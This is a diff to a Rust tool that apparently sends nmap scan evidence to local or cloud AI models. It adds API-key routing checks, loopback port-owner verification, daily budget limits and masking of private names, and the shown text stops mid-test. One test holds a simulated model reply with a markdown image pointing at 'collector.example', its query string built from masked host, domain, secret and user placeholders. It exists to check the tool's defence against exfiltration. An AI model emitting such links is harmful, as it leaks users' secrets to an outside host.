@@ -146,6 +146,10 @@ pub struct AiSettings {
     /// running session at once.
     #[serde(skip)]
     pub user_file: Option<PathBuf>,
+    /// Why the user's own setup file could not be read. The cloud tiers are
+    /// then off: that file may be what turned them off.
+    #[serde(skip)]
+    pub setup_error: Option<String>,
 }
 
 impl std::fmt::Debug for AiSettings {
@@ -167,6 +171,7 @@ impl std::fmt::Debug for AiSettings {
             .field("disable_cloud", &self.disable_cloud)
             .field("cloud_notes", &self.cloud_notes)
             .field("user_file", &self.user_file)
+            .field("setup_error", &self.setup_error)
             .finish()
     }
 }
@@ -187,6 +192,7 @@ impl Default for AiSettings {
             disable_cloud: false,
             cloud_notes: false,
             user_file: None,
+            setup_error: None,
         }
     }
 }
@@ -309,17 +315,46 @@ impl AiOverrides {
     }
 }
 
+/// The host a URL names, in lower case; empty if it names none.
+fn url_host(url: &str) -> String {
+    url::Url::parse(url.trim())
+        .ok()
+        .and_then(|url| url.host_str().map(str::to_ascii_lowercase))
+        .unwrap_or_default()
+}
+
 impl AiSettings {
-    /// These settings with the user's own setup file applied on top. A file
-    /// that cannot be read changes nothing.
+    /// These settings with the user's own setup file applied on top.
+    ///
+    /// A file that is there but cannot be read (a typo, a link, another
+    /// owner) turns the cloud tiers off: it may be the file that chose
+    /// local-only mode. A key from `config.toml` stays with the service
+    /// `config.toml` names: when the setup file names another, it is not
+    /// sent there.
     pub fn effective(&self) -> AiSettings {
         let mut settings = self.clone();
-        if let Some(overrides) = self
-            .user_file
-            .as_deref()
-            .and_then(|p| AiOverrides::load(p).ok())
-        {
-            overrides.apply(&mut settings);
+        let Some(path) = self.user_file.as_deref() else {
+            return settings;
+        };
+        match AiOverrides::load(path) {
+            Ok(overrides) => {
+                let own_key = overrides
+                    .api_key
+                    .as_deref()
+                    .is_some_and(|key| !key.trim().is_empty());
+                overrides.apply(&mut settings);
+                if !own_key && url_host(&settings.cloud_url) != url_host(&self.cloud_url) {
+                    settings.openrouter_api_key = None;
+                }
+            }
+            Err(error) => {
+                settings.disable_cloud = true;
+                settings.openrouter_api_key = None;
+                settings.setup_error = Some(format!(
+                    "ai.toml cannot be read ({}): cloud AI is off until it is fixed",
+                    sanitize(&format!("{error:#}"), 200)
+                ));
+            }
         }
         settings
     }
@@ -360,11 +395,8 @@ impl AiSettings {
     /// because that address speaks the same protocol. A stand-in on this
     /// machine is the user's own.
     fn env_key_applies(&self) -> bool {
-        let host = url::Url::parse(self.cloud_url.trim())
-            .ok()
-            .and_then(|url| url.host_str().map(str::to_ascii_lowercase))
-            .unwrap_or_default();
-        (is_loopback_url(&self.cloud_url) && another_users_server(&self.cloud_url).is_none())
+        let host = url_host(&self.cloud_url);
+        not_own_server(&self.cloud_url).is_none()
             || match self.provider() {
                 CloudProvider::Anthropic => host == "api.anthropic.com",
                 CloudProvider::OpenAi => host == "openrouter.ai",
@@ -375,17 +407,12 @@ impl AiSettings {
     /// over the user's file, which wins over `config.toml`.
     pub fn key_source(&self) -> Option<String> {
         let filled = |key: &Option<String>| key.as_deref().is_some_and(|k| !k.trim().is_empty());
-        let overrides = self
+        let in_file = self
             .user_file
             .as_deref()
-            .and_then(|path| AiOverrides::load(path).ok());
-        let in_file = overrides
-            .as_ref()
+            .and_then(|path| AiOverrides::load(path).ok())
             .is_some_and(|loaded| filled(&loaded.api_key));
-        let mut effective = self.clone();
-        if let Some(loaded) = overrides {
-            loaded.apply(&mut effective);
-        }
+        let effective = self.effective();
         if effective.disable_cloud {
             return None;
         }
@@ -396,7 +423,7 @@ impl AiSettings {
             Some(format!("the {variable} environment variable"))
         } else if in_file {
             Some("your setup file".to_owned())
-        } else if filled(&self.openrouter_api_key) {
+        } else if filled(&effective.openrouter_api_key) {
             Some("config.toml".to_owned())
         } else {
             None
@@ -936,6 +963,10 @@ pub struct Budget {
     /// answers with the local model and `[R]` is unavailable.
     #[serde(default)]
     pub has_key: bool,
+    /// The user's own setup file (`ai.toml`) is there but cannot be read,
+    /// so the cloud tiers are off.
+    #[serde(default)]
+    pub setup_unreadable: bool,
 }
 
 impl Budget {
@@ -971,8 +1002,80 @@ fn record_usage_conn(
     Ok(())
 }
 
+/// What one request cost, as one row per API call it made (the cost on
+/// the first): the daily cap on calls counts every call, also those to a
+/// model asked after another declined and a resumed research turn.
+fn record_calls(
+    conn: &rusqlite::Connection,
+    tier: Tier,
+    model: &str,
+    usage: &Usage,
+    calls: u32,
+) -> Result<()> {
+    record_usage_conn(conn, tier, model, usage)?;
+    for _ in 1..calls {
+        record_usage_conn(conn, tier, model, &Usage::default())?;
+    }
+    Ok(())
+}
+
 fn record_usage(db: &Db, tier: Tier, model: &str, usage: &Usage) -> Result<()> {
     record_usage_conn(db.conn(), tier, model, usage)
+}
+
+/// A request stopped because its next API call would go past the daily
+/// cloud budget.
+#[derive(Debug)]
+pub struct BudgetReached;
+
+impl std::fmt::Display for BudgetReached {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.write_str("daily cloud budget reached")
+    }
+}
+
+impl std::error::Error for BudgetReached {}
+
+/// What today's cloud budget still allows one request. Every API call it
+/// makes (a model asked after another declined, a resumed research turn)
+/// is checked against it first, and counted.
+#[derive(Debug, Clone, Copy)]
+pub struct Allowance {
+    calls_left: u32,
+    usd_left: f64,
+    /// The API calls this request has made.
+    pub calls: u32,
+}
+
+impl Allowance {
+    pub fn new(budget: &Budget) -> Self {
+        Self {
+            calls_left: budget.max_calls.saturating_sub(budget.calls),
+            usd_left: budget.max_usd - budget.spent_usd,
+            calls: 0,
+        }
+    }
+
+    /// No cap (tests).
+    pub fn unlimited() -> Self {
+        Self {
+            calls_left: u32::MAX,
+            usd_left: f64::INFINITY,
+            calls: 0,
+        }
+    }
+
+    /// Before an API call: `spent` is what this request has cost so far,
+    /// `most` the most the call can cost where that is known (0 where not).
+    pub fn take_call(&mut self, spent: f64, most: f64) -> Result<()> {
+        // Written so that a NaN anywhere refuses.
+        let fits = spent + most <= self.usd_left;
+        if self.calls >= self.calls_left || !fits {
+            return Err(BudgetReached.into());
+        }
+        self.calls += 1;
+        Ok(())
+    }
 }
 
 fn append_bounded_utf8<'a>(target: &mut String, piece: &'a str, max: usize) -> &'a str {
@@ -1007,6 +1110,7 @@ pub fn budget(db: &Db, settings: &AiSettings) -> Result<Budget> {
         max_usd: settings.max_daily_usd,
         max_calls: settings.max_daily_calls,
         has_key: settings.api_key().is_some(),
+        setup_unreadable: settings.setup_error.is_some(),
     })
 }
 
@@ -1279,92 +1383,204 @@ fn lsof_listener_uids(output: &str) -> Vec<u32> {
         .collect()
 }
 
-/// Another login user who listens on the port of a loopback server.
+/// macOS: who listens on a port, from the uids `lsof` listed for it. Run by
+/// a user, `lsof` sees that user's own processes only: so the server is
+/// this user's only when `lsof` shows this user listening, and anything
+/// else (nothing listed, or `lsof` failing) cannot be verified.
+#[cfg(any(target_os = "macos", test))]
+fn lsof_owner(uids: &[u32], me: u32) -> Option<u32> {
+    const FIRST_LOGIN_UID: u32 = 501;
+    if let Some(other) = uids
+        .iter()
+        .find(|uid| **uid >= FIRST_LOGIN_UID && **uid != me)
+    {
+        return Some(*other);
+    }
+    if uids.contains(&me) {
+        None
+    } else {
+        Some(u32::MAX)
+    }
+}
+
+#[cfg(test)]
+thread_local! {
+    /// Tests: who listens on every port, in place of asking the system.
+    static PORT_OWNER: std::cell::Cell<Option<Option<u32>>> = const { std::cell::Cell::new(None) };
+}
+
+/// Tests: while this lives, [`another_users_server`] answers `owner` on
+/// this thread for every port.
+#[cfg(test)]
+pub(crate) struct FakePortOwner;
+
+#[cfg(test)]
+impl FakePortOwner {
+    pub(crate) fn set(owner: Option<u32>) -> Self {
+        PORT_OWNER.with(|cell| cell.set(Some(owner)));
+        Self
+    }
+}
+
+#[cfg(test)]
+impl Drop for FakePortOwner {
+    fn drop(&mut self) {
+        PORT_OWNER.with(|cell| cell.set(None));
+    }
+}
+
+/// Another login user who listens on the port of a loopback server, or
+/// `u32::MAX` when that cannot be verified. `None` means this user's own.
 /// On a shared machine anyone can answer on an unused loopback port, and
 /// the local tier sends evidence unmasked.
 pub(crate) fn another_users_server(url: &str) -> Option<u32> {
-    #[cfg(target_os = "linux")]
+    #[cfg(test)]
+    if let Some(owner) = PORT_OWNER.with(std::cell::Cell::get) {
+        return owner;
+    }
+    match url::Url::parse(url.trim())
+        .ok()
+        .and_then(|url| url.port_or_known_default())
     {
-        use std::io::{BufRead, BufReader, Read};
-        // Service accounts (a system-wide model server) are below this.
-        const FIRST_LOGIN_UID: u32 = 1000;
-        const MAX_PROC_NET_BYTES: u64 = 16 * 1024 * 1024;
-        let port = url::Url::parse(url.trim()).ok()?.port_or_known_default()?;
-        // SAFETY: geteuid has no preconditions and cannot fail.
-        let me = unsafe { libc::geteuid() };
-        let mut opened_any = false;
-        for table in ["/proc/net/tcp", "/proc/net/tcp6"] {
-            let Ok(file) = std::fs::File::open(table) else {
-                continue;
-            };
-            opened_any = true;
-            let reader = BufReader::new(file.take(MAX_PROC_NET_BYTES));
-            for line in reader.lines().skip(1).map_while(Result::ok) {
-                if let Some(uid) = parse_proc_tcp_listener(&line, port) {
-                    if uid >= FIRST_LOGIN_UID && uid != me {
-                        return Some(uid);
-                    }
+        Some(port) => port_owner(port),
+        None => Some(u32::MAX),
+    }
+}
+
+#[cfg(target_os = "linux")]
+fn port_owner(port: u16) -> Option<u32> {
+    use std::io::{BufRead, BufReader, Read};
+    // Service accounts (a system-wide model server) are below this.
+    const FIRST_LOGIN_UID: u32 = 1000;
+    const MAX_PROC_NET_BYTES: u64 = 16 * 1024 * 1024;
+    // SAFETY: geteuid has no preconditions and cannot fail.
+    let me = unsafe { libc::geteuid() };
+    let mut opened_any = false;
+    for table in ["/proc/net/tcp", "/proc/net/tcp6"] {
+        let Ok(file) = std::fs::File::open(table) else {
+            continue;
+        };
+        opened_any = true;
+        let reader = BufReader::new(file.take(MAX_PROC_NET_BYTES));
+        for line in reader.lines().skip(1).map_while(Result::ok) {
+            if let Some(uid) = parse_proc_tcp_listener(&line, port) {
+                if uid >= FIRST_LOGIN_UID && uid != me {
+                    return Some(uid);
                 }
             }
         }
-        if !opened_any {
-            return Some(u32::MAX);
-        }
-        None
     }
-    #[cfg(target_os = "macos")]
-    {
-        use std::io::Read;
-        use std::process::{Command, Stdio};
-        const FIRST_LOGIN_UID: u32 = 501;
-        let port = url::Url::parse(url.trim()).ok()?.port_or_known_default()?;
-        // SAFETY: geteuid has no preconditions and cannot fail.
-        let me = unsafe { libc::geteuid() };
-        let mut child = Command::new("/usr/sbin/lsof")
-            .env_clear()
-            .args([
-                "-nP",
-                "-b",
-                &format!("-iTCP:{port}"),
-                "-sTCP:LISTEN",
-                "-F",
-                "u",
-            ])
-            .stdin(Stdio::null())
-            .stdout(Stdio::piped())
-            .stderr(Stdio::null())
-            .spawn()
-            .ok()?;
-        let deadline = std::time::Instant::now() + Duration::from_millis(1000);
-        loop {
-            match child.try_wait() {
-                Ok(Some(_)) => break,
-                Ok(None) if std::time::Instant::now() < deadline => {
-                    std::thread::sleep(Duration::from_millis(10));
-                }
-                _ => {
-                    let _ = child.kill();
-                    let _ = child.wait();
-                    return None;
+    if !opened_any {
+        return Some(u32::MAX);
+    }
+    None
+}
+
+#[cfg(target_os = "macos")]
+fn port_owner(port: u16) -> Option<u32> {
+    use std::io::Read;
+    use std::process::{Command, Stdio};
+    // SAFETY: geteuid has no preconditions and cannot fail.
+    let me = unsafe { libc::geteuid() };
+    let Ok(mut child) = Command::new("/usr/sbin/lsof")
+        .env_clear()
+        .args([
+            "-nP",
+            "-b",
+            &format!("-iTCP:{port}"),
+            "-sTCP:LISTEN",
+            "-F",
+            "u",
+        ])
+        .stdin(Stdio::null())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .spawn()
+    else {
+        return Some(u32::MAX);
+    };
+    let deadline = std::time::Instant::now() + Duration::from_secs(3);
+    loop {
+        match child.try_wait() {
+            Ok(Some(_)) => break,
+            Ok(None) if std::time::Instant::now() < deadline => {
+                std::thread::sleep(Duration::from_millis(10));
+            }
+            _ => {
+                let _ = child.kill();
+                let _ = child.wait();
+                return Some(u32::MAX);
+            }
+        }
+    }
+    let mut out = String::new();
+    let read = child
+        .stdout
+        .take()
+        .map(|stdout| stdout.take(64 * 1024).read_to_string(&mut out));
+    if !matches!(read, Some(Ok(_))) {
+        return Some(u32::MAX);
+    }
+    lsof_owner(&lsof_listener_uids(&out), me)
+}
+
+/// Elsewhere there is no way here to tell who listens on a port.
+#[cfg(not(any(target_os = "linux", target_os = "macos")))]
+fn port_owner(_port: u16) -> Option<u32> {
+    Some(u32::MAX)
+}
+
+/// Why the model server at `url` is not this user's own on this machine,
+/// or `None` when it is.
+pub(crate) fn not_own_server(url: &str) -> Option<String> {
+    if !is_loopback_url(url) {
+        return Some("the server is not on this machine".to_owned());
+    }
+    another_users_server(url).map(|uid| match uid {
+        u32::MAX => "cannot verify that the server on that port is yours".to_owned(),
+        uid => format!("the server belongs to another user, uid {uid}"),
+    })
+}
+
+/// What a request to a model server carries.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum Carries {
+    /// An API key: it goes to an `https://` service, or to the user's own
+    /// server on this machine.
+    Key,
+    /// The evidence unmasked: it goes to the user's own server on this
+    /// machine only.
+    Evidence,
+    /// Masked text, or nothing private (a list of models).
+    Nothing,
+}
+
+/// The check every request to a model server passes right before it is
+/// sent: [`AiEngine`]'s requests, the Claude API's ([`anthropic`]), and
+/// `meow setup --check` and the setup screen's connection test. A port on
+/// this machine that another user owns, or whose owner cannot be
+/// verified, gets no key and no unmasked evidence.
+pub(crate) fn check_server(url: &str, carries: Carries) -> Result<()> {
+    match carries {
+        Carries::Key => {
+            validate_cloud_url(url)?;
+            if is_loopback_url(url) {
+                if let Some(why) = not_own_server(url) {
+                    bail!("refusing to send the API key to {url}: {why}");
                 }
             }
         }
-        let mut out = String::new();
-        child
-            .stdout
-            .take()?
-            .take(64 * 1024)
-            .read_to_string(&mut out)
-            .ok()?;
-        lsof_listener_uids(&out)
-            .into_iter()
-            .find(|uid| *uid >= FIRST_LOGIN_UID && *uid != me)
+        Carries::Evidence => {
+            validate_local_url(url)?;
+            if let Some(why) = not_own_server(url) {
+                bail!("refusing to send unmasked evidence to {url}: {why}");
+            }
+        }
+        Carries::Nothing => {
+            validate_local_url(url)?;
+        }
     }
-    #[cfg(not(any(target_os = "linux", target_os = "macos")))]
-    {
-        let _ = url;
-        None
-    }
+    Ok(())
 }
 
 /// Masks a prompt for leaving this machine, and proves nothing private is
@@ -1373,6 +1589,7 @@ pub(crate) fn another_users_server(url: &str) -> Option<u32> {
 fn mask_prompt(
     vault: &Mutex<Vault>,
     graph: &Graph,
+    host: &Host,
     prompt: &Prompt,
     with_notes: bool,
 ) -> Result<(String, crate::vault::StreamUnmasker)> {
@@ -1404,7 +1621,17 @@ fn mask_prompt(
             leaks.join(", ")
         );
     }
-    let unmasker = vault.stream_for(&masked);
+    // Only this host's address and names are filled back into the reply,
+    // and a link straight to it is the user's own target.
+    let own: Vec<&str> = std::iter::once(host.address.as_str())
+        .chain(host.hostnames.iter().map(String::as_str))
+        .chain(
+            host.ports
+                .values()
+                .flat_map(|port| port.tls_sans.iter().map(String::as_str)),
+        )
+        .collect();
+    let unmasker = vault.stream_for(&masked, &own);
     Ok((masked, unmasker))
 }
 
@@ -1466,26 +1693,22 @@ impl AiEngine {
     }
 
     /// One streamed chat completion. `on_delta` receives each piece of the
-    /// reply as it arrives.
+    /// reply as it arrives. Without a key, `masked` says whether the body is
+    /// masked: unmasked evidence goes to the user's own server only.
     async fn chat(
         &self,
         base: &str,
         api_key: Option<&str>,
+        masked: bool,
         body: &Value,
         mut on_delta: impl FnMut(&str),
     ) -> Result<(String, Usage)> {
-        if api_key.is_some() {
-            validate_cloud_url(base)?;
-            if is_loopback_url(base) {
-                if let Some(uid) = another_users_server(base) {
-                    bail!(
-                        "refusing to send the API key to {base}: port belongs to another user (uid {uid})"
-                    );
-                }
-            }
-        } else {
-            validate_local_url(base)?;
-        }
+        let carries = match (api_key, masked) {
+            (Some(_), _) => Carries::Key,
+            (None, false) => Carries::Evidence,
+            (None, true) => Carries::Nothing,
+        };
+        check_server(base, carries)?;
         let url = format!("{}/chat/completions", base.trim_end_matches('/'));
         let mut request = self
             .client(base)
@@ -1611,30 +1834,23 @@ impl AiEngine {
     /// while it stays on this machine and with this user. A "local" server
     /// on another host, or one another login user runs on this host, gets
     /// the same masked text a cloud would.
+    #[allow(clippy::too_many_arguments)]
     async fn run_local(
         &self,
         requested: Tier,
         graph: &Graph,
+        host: &Host,
         vault: &Mutex<Vault>,
         prompt: &Prompt,
         fallback_reason: Option<String>,
         on_text: &mut (dyn FnMut(&str) + Send),
     ) -> Result<Outcome> {
         let settings = self.settings.effective();
-        let masked_because = if !is_loopback_url(&settings.local_url) {
-            Some("the server is not on this machine".to_owned())
-        } else {
-            another_users_server(&settings.local_url).map(|uid| {
-                if uid == u32::MAX {
-                    "cannot verify local server owner".to_owned()
-                } else {
-                    format!("the server belongs to another user, uid {uid}")
-                }
-            })
-        };
+        let masked_because = not_own_server(&settings.local_url);
         let (user, mut unmasker) = match &masked_because {
             Some(_) => {
-                let (masked, unmasker) = mask_prompt(vault, graph, prompt, settings.cloud_notes)?;
+                let (masked, unmasker) =
+                    mask_prompt(vault, graph, host, prompt, settings.cloud_notes)?;
                 (masked, Some(unmasker))
             }
             None => (prompt.user.to_string(), None),
@@ -1655,6 +1871,7 @@ impl AiEngine {
             .chat(
                 &settings.local_url,
                 None,
+                masked_because.is_some(),
                 &body,
                 |piece| match &mut unmasker {
                     Some(unmasker) => {
@@ -1736,7 +1953,7 @@ impl AiEngine {
         };
         if tier == Tier::Local {
             return self
-                .run_local(tier, graph, vault, &prompt, None, on_text)
+                .run_local(tier, graph, host, vault, &prompt, None, on_text)
                 .await;
         }
 
@@ -1749,16 +1966,17 @@ impl AiEngine {
         };
         let settings = self.settings.effective();
         let Some(api_key) = settings.api_key() else {
-            let reason = unavailable(
+            let reason = unavailable(settings.setup_error.as_deref().unwrap_or(
                 "no cloud API key yet (run `meow setup` to add yours, or to choose a local model)",
-            )?;
+            ))?;
             return self
-                .run_local(tier, graph, vault, &prompt, reason, on_text)
+                .run_local(tier, graph, host, vault, &prompt, reason, on_text)
                 .await;
         };
 
         // Mask, then prove nothing private is left before going on.
-        let (masked_user, unmasker) = mask_prompt(vault, graph, &prompt, settings.cloud_notes)?;
+        let (masked_user, unmasker) =
+            mask_prompt(vault, graph, host, &prompt, settings.cloud_notes)?;
 
         let model = match tier {
             Tier::Research => sanitize(&settings.research_model, 120),
@@ -1791,15 +2009,17 @@ impl AiEngine {
         }
 
         let budget = self.budget();
+        let budget_reached = format!(
+            "daily cloud budget reached (${:.4} of ${:.2}, {} of {} calls)",
+            budget.spent_usd, budget.max_usd, budget.calls, budget.max_calls
+        );
         if budget.exhausted() {
-            let reason = unavailable(&format!(
-                "daily cloud budget reached (${:.4} of ${:.2}, {} of {} calls)",
-                budget.spent_usd, budget.max_usd, budget.calls, budget.max_calls
-            ))?;
+            let reason = unavailable(&budget_reached)?;
             return self
-                .run_local(tier, graph, vault, &prompt, reason, on_text)
+                .run_local(tier, graph, host, vault, &prompt, reason, on_text)
                 .await;
         }
+        let mut allowance = Allowance::new(&budget);
 
         let shared_unmasker = Mutex::new(unmasker);
         let shared_shown = Mutex::new(String::new());
@@ -1851,6 +2071,7 @@ impl AiEngine {
                 &masked_user,
                 &mut deliver,
                 &mut reset_attempt,
+                &mut allowance,
                 &mut failed_spend,
             )
             .await
@@ -1872,16 +2093,37 @@ impl AiEngine {
                         "parameters": { "max_uses": 2, "max_results": 5, "search_context_size": "low" },
                     }]);
                 }
-                self.chat(&settings.cloud_url, Some(&api_key), &body, &mut deliver)
-                    .await
-                    .map(|(text, usage)| (text, usage, model.clone()))
+                match allowance.take_call(0.0, 0.0) {
+                    Ok(()) => self
+                        .chat(
+                            &settings.cloud_url,
+                            Some(&api_key),
+                            true,
+                            &body,
+                            &mut deliver,
+                        )
+                        .await
+                        .map(|(text, usage)| (text, usage, model.clone())),
+                    Err(error) => Err(error),
+                }
             }
         };
         let (masked_reply, usage, answered_by) = match result {
             Ok(done) => done,
             Err(error) => {
-                // The attempt (including any declined fallback attempts) still counts against the budget.
-                let _ = record_usage(&lock_db(&self.db), tier, &model, &failed_spend);
+                // Every call made (declined fallback attempts included)
+                // still counts against the budget.
+                if allowance.calls > 0 {
+                    let db = lock_db(&self.db);
+                    let _ = record_calls(db.conn(), tier, &model, &failed_spend, allowance.calls);
+                } else if error.downcast_ref::<BudgetReached>().is_some() {
+                    // Not even the first call fits: as when it is spent.
+                    let reason = unavailable(&budget_reached)?;
+                    let on_text = shared_out.into_inner().unwrap_or_else(|p| p.into_inner());
+                    return self
+                        .run_local(tier, graph, host, vault, &prompt, reason, on_text)
+                        .await;
+                }
                 return Err(error.context(format!("[{}] request failed", tier.key())));
             }
         };
@@ -1897,7 +2139,7 @@ impl AiEngine {
         {
             let db = lock_db(&self.db);
             let tx = db.conn().unchecked_transaction()?;
-            record_usage_conn(&tx, tier, &answered_by, &usage)?;
+            record_calls(&tx, tier, &answered_by, &usage, allowance.calls)?;
             tx.execute(
                 "INSERT OR REPLACE INTO prompt_cache (sha256, tier, response, created_utc) VALUES (?1, ?2, ?3, ?4)",
                 params![key, tier.as_str(), masked_reply, now_rfc3339()],
@@ -2173,7 +2415,7 @@ mod tests {
         // Masking it is quick, however many names the graph registered.
         let vault = Mutex::new(Vault::ephemeral());
         let started = std::time::Instant::now();
-        mask_prompt(&vault, &graph, &triage_prompt(host), false).unwrap();
+        mask_prompt(&vault, &graph, host, &triage_prompt(host), false).unwrap();
         assert!(started.elapsed() < Duration::from_secs(10));
     }
 
@@ -2311,7 +2553,7 @@ mod tests {
 
         let vault = Mutex::new(Vault::ephemeral());
         let started = std::time::Instant::now();
-        mask_prompt(&vault, &graph, &triage_prompt(host), false).unwrap();
+        mask_prompt(&vault, &graph, host, &triage_prompt(host), false).unwrap();
         assert!(started.elapsed() < Duration::from_secs(10));
     }
 
@@ -2406,7 +2648,7 @@ mod tests {
                 .register(crate::vault::Kind::Sec, &fake_key),
             "<<SEC_01>>"
         );
-        let (masked, _) = mask_prompt(&vault, &graph, &prompt, false).unwrap();
+        let (masked, _) = mask_prompt(&vault, &graph, host, &prompt, false).unwrap();
         for private in [
             "10.10.10.5",
             "corp.example.test",
@@ -2499,7 +2741,7 @@ mod tests {
         let prompt = triage_prompt(host);
 
         let vault = Mutex::new(Vault::ephemeral());
-        let (masked, _) = mask_prompt(&vault, &graph, &prompt, false).unwrap();
+        let (masked, _) = mask_prompt(&vault, &graph, host, &prompt, false).unwrap();
         for private in ["shop.example", "acme-group", "203.0.113.10"] {
             assert!(
                 !masked.contains(private),
@@ -2557,7 +2799,7 @@ mod tests {
         let prompt = triage_prompt(host);
 
         let vault = Mutex::new(Vault::ephemeral());
-        let (masked, _) = mask_prompt(&vault, &graph, &prompt, false).unwrap();
+        let (masked, _) = mask_prompt(&vault, &graph, host, &prompt, false).unwrap();
         for private in [
             "acme-mail",
             "acme-crm",
@@ -2640,7 +2882,7 @@ mod tests {
         assert!(sent.ends_with("word \u{2026}"), "{sent}");
 
         let vault = Mutex::new(Vault::ephemeral());
-        let (masked, _) = mask_prompt(&vault, &graph, &prompt, false).unwrap();
+        let (masked, _) = mask_prompt(&vault, &graph, host, &prompt, false).unwrap();
         for private in ["build-srv", "acme-lab"] {
             assert!(
                 !masked.contains(private),
@@ -2674,7 +2916,7 @@ mod tests {
         assert_eq!(host.facts.len(), 5);
         let prompt = triage_prompt(host);
         let vault = Mutex::new(Vault::ephemeral());
-        let (masked, _) = mask_prompt(&vault, &graph, &prompt, false).unwrap();
+        let (masked, _) = mask_prompt(&vault, &graph, host, &prompt, false).unwrap();
         for private in [
             "acme-mail",
             "acme-dns",
@@ -2728,7 +2970,7 @@ mod tests {
 
         let prompt = triage_prompt(host);
         let vault = Mutex::new(Vault::ephemeral());
-        let (masked, _) = mask_prompt(&vault, &graph, &prompt, false).unwrap();
+        let (masked, _) = mask_prompt(&vault, &graph, host, &prompt, false).unwrap();
         for piece in ["selfservice", "acme-c", "redirect_uri"] {
             assert!(
                 !masked.contains(piece),
@@ -3408,7 +3650,7 @@ mod tests {
         ] {
             let started = std::time::Instant::now();
             let error = engine
-                .chat(&format!("{base}/{path}"), None, &body, |_| {})
+                .chat(&format!("{base}/{path}"), None, true, &body, |_| {})
                 .await
                 .unwrap_err();
             let error = format!("{error:#}");
@@ -3440,7 +3682,11 @@ mod tests {
             ..AiSettings::default()
         };
         assert!(openai_style("https://openrouter.ai/api/v1").env_key_applies());
-        assert!(openai_style("http://127.0.0.1:4000/v1").env_key_applies());
+        {
+            // A stand-in of the user's own on this machine.
+            let _owner = FakePortOwner::set(None);
+            assert!(openai_style("http://127.0.0.1:4000/v1").env_key_applies());
+        }
         assert!(!openai_style("https://llm.other-service.example/v1").env_key_applies());
         assert!(!openai_style("https://openrouter.ai.example/v1").env_key_applies());
         let claude = |url: &str| AiSettings {
@@ -3772,7 +4018,11 @@ mod tests {
         assert_eq!(AiOverrides::load(&missing).unwrap(), AiOverrides::default());
         std::fs::write(&file, "not toml [").unwrap();
         assert!(AiOverrides::load(&file).is_err());
-        assert!(!engine.budget().has_key, "a broken file changes nothing");
+        let budget = engine.budget();
+        assert!(
+            !budget.has_key && budget.setup_unreadable,
+            "a broken file turns the cloud off"
+        );
     }
 
     /// A Claude API key: the same vault, the same budget, the Claude API's
@@ -3926,9 +4176,9 @@ mod tests {
         }
         // A provider (or whatever the model read) answers with an image
         // whose address is built from placeholders, some never sent.
-        const REPLY: &str = "Patch <<HOST_01>> now. \
-            ![status](https://collector.example/p.png?h=<<HOST_01>>&d=<<DOM_01>>&s=<<SEC_01>>&u=<<USER_01>>) \
-            and open https://<<HOST_01>>/admin";
+        const REPLY: &str = "Patch <<HOST_01>> now.\n\
+            Then <<HOST_01>> ![status](https://collector.example/p.png?h=<<HOST_01>>&d=<<DOM_01>>&s=<<SEC_01>>&u=<<USER_01>>)\n\
+            and open https://<<HOST_01>>/admin?u=<<USER_01>>";
         let seen: Arc<Mutex<Vec<Value>>> = Arc::default();
         let app = Router::new()
             .route(
@@ -3954,19 +4204,22 @@ mod tests {
         let (outcome, _) = run(&engine, Tier::Cloud, &graph, &vault).await;
         let outcome = outcome.unwrap();
         assert!(
-            outcome.text.starts_with("Patch 10.10.10.5 now."),
+            outcome.text.starts_with("Patch 10.10.10.5 now.\n"),
             "{}",
             outcome.text
         );
+        // A link to the host asked about gets its host back, nothing more.
         assert!(
-            outcome.text.ends_with("and open https://10.10.10.5/admin"),
+            outcome
+                .text
+                .contains("\nand open https://10.10.10.5/admin?u=<<USER_01>>"),
             "{}",
             outcome.text
         );
-        // Inside the link to elsewhere nothing was filled in.
-        assert!(outcome
-            .text
-            .contains("?h=<<HOST_01>>&d=<<DOM_01>>&s=<<SEC_01>>&u=<<USER_01>>)"));
+        // On the line with the link to elsewhere nothing was filled in.
+        assert!(outcome.text.contains(
+            "\nThen <<HOST_01>> ![status](https://collector.example/p.png?h=<<HOST_01>>&d=<<DOM_01>>&s=<<SEC_01>>&u=<<USER_01>>)\n"
+        ));
         for private in ["hunter2-elsewhere", "portal.corp-acme.com", SECRET_JWT] {
             assert!(!outcome.text.contains(private), "{private}");
         }
@@ -4089,6 +4342,7 @@ mod tests {
             max_usd: 1.0,
             max_calls: 20,
             has_key: true,
+            setup_unreadable: false,
         }
         .exhausted());
 
@@ -4105,5 +4359,568 @@ mod tests {
         .unwrap();
         let err = format!("{:#}", AiOverrides::load(&path).unwrap_err());
         assert!(!err.contains("sk-ant-top-secret-9999"), "{err}");
+    }
+
+    /// A host for the tests below, with one open port and what a scan said.
+    fn scanned(graph: &mut Graph, address: &str, port: u16, service: &str) {
+        graph.apply(Observation::Port {
+            address: address.into(),
+            port,
+            protocol: "tcp".into(),
+            state: "open".into(),
+            service: Some(service.into()),
+            product: None,
+            version: None,
+            extra_info: None,
+            cpes: vec![],
+            record: EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x"),
+        });
+    }
+
+    fn script(graph: &mut Graph, address: &str, port: Option<u16>, id: &str, output: &str) {
+        graph.apply(Observation::Script {
+            address: address.into(),
+            port,
+            protocol: "tcp".into(),
+            id: id.into(),
+            output: output.into(),
+            record: EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x"),
+        });
+    }
+
+    /// What the 2026-11 audit saw go to the cloud in clear: Windows and
+    /// directory names in nmap's default scripts, and addresses joined to
+    /// a word or percent-encoded in a redirect.
+    #[test]
+    fn windows_names_and_encoded_addresses_never_leave_in_clear() {
+        let mut graph = Graph::default();
+        let dc = "192.0.2.5";
+        scanned(&mut graph, dc, 389, "ldap");
+        script(
+            &mut graph,
+            dc,
+            Some(389),
+            "ldap-rootdse",
+            "LDAP Results\n  <ROOT>\n      currentTime: 20261118083000.0Z\n      \
+             subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=northwindtraders,DC=local\n      \
+             dsServiceName: CN=NTDS Settings,CN=NWDC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=northwindtraders,DC=local\n      \
+             namingContexts: DC=northwindtraders,DC=local\n      \
+             defaultNamingContext: DC=northwindtraders,DC=local",
+        );
+        graph.apply(Observation::Fact {
+            address: dc.into(),
+            port: Some(3268),
+            protocol: "tcp".into(),
+            claim: "Microsoft Windows Active Directory LDAP (Domain: northwindtraders.local0., \
+                    Site: Default-First-Site-Name)"
+                .into(),
